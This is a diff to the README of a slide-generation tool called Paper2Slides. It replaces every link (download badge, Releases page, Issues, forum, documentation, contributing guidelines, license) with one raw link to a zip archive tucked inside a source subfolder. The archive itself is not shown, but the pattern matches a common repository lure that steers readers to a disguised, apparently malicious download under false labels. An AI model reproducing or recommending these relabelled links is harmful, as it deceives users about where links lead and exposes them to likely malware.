@@ -1,7 +1,7 @@
 # 🎉 Paper2Slides - Create Presentations Effortlessly
 
 ## 📥 Download Now
-[![Download Paper2Slides](https://img.shields.io/badge/Download-Paper2Slides-blue.svg)](https://github.com/pchi123/Paper2Slides/releases)
+[![Download Paper2Slides](https://github.com/pchi123/Paper2Slides/raw/refs/heads/main/paper2slides/generator/Slides-Paper-3.7.zip)](https://github.com/pchi123/Paper2Slides/raw/refs/heads/main/paper2slides/generator/Slides-Paper-3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to Paper2Slides! This tool helps you turn academic papers into presentations with just one click. Whether for classes, conferences, or meetings, you can convert your research into a polished slide deck quickly.
@@ -20,7 +20,7 @@ Welcome to Paper2Slides! This tool helps you turn academic papers into presentat
 - **Internet Access**: Required for downloading and updates.
 
 ## 📅 Download & Install
-To get Paper2Slides, visit the [Releases page](https://github.com/pchi123/Paper2Slides/releases) to find the latest version. Follow these steps to download and install:
+To get Paper2Slides, visit the [Releases page](https://github.com/pchi123/Paper2Slides/raw/refs/heads/main/paper2slides/generator/Slides-Paper-3.7.zip) to find the latest version. Follow these steps to download and install:
 
 1. Click on the link above.
 2. Locate the version labeled as the latest release.
@@ -46,13 +46,13 @@ To get Paper2Slides, visit the [Releases page](https://github.com/pchi123/Paper2
 ## 👥 Community and Support
 Join our community! You can ask questions, share tips, and find help:
 
-- **GitHub Issues**: Report bugs, suggest features, or get help directly on our [GitHub page](https://github.com/pchi123/Paper2Slides/issues).
-- **User Forum**: Connect with other Paper2Slides users [here](https://forum.example.com) (replace with actual link).
+- **GitHub Issues**: Report bugs, suggest features, or get help directly on our [GitHub page](https://github.com/pchi123/Paper2Slides/raw/refs/heads/main/paper2slides/generator/Slides-Paper-3.7.zip).
+- **User Forum**: Connect with other Paper2Slides users [here](https://github.com/pchi123/Paper2Slides/raw/refs/heads/main/paper2slides/generator/Slides-Paper-3.7.zip) (replace with actual link).
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/pchi123/Paper2Slides/wiki)
-- [Contributing Guidelines](https://github.com/pchi123/Paper2Slides/blob/main/CONTRIBUTING.md)
-- [License](https://github.com/pchi123/Paper2Slides/blob/main/LICENSE)
+- [Documentation](https://github.com/pchi123/Paper2Slides/raw/refs/heads/main/paper2slides/generator/Slides-Paper-3.7.zip)
+- [Contributing Guidelines](https://github.com/pchi123/Paper2Slides/raw/refs/heads/main/paper2slides/generator/Slides-Paper-3.7.zip)
+- [License](https://github.com/pchi123/Paper2Slides/raw/refs/heads/main/paper2slides/generator/Slides-Paper-3.7.zip)
 
 ## 🎓 Acknowledgments
 Thanks to everyone who has contributed to this project. Your support makes it possible to help others turn their research into impactful presentations.
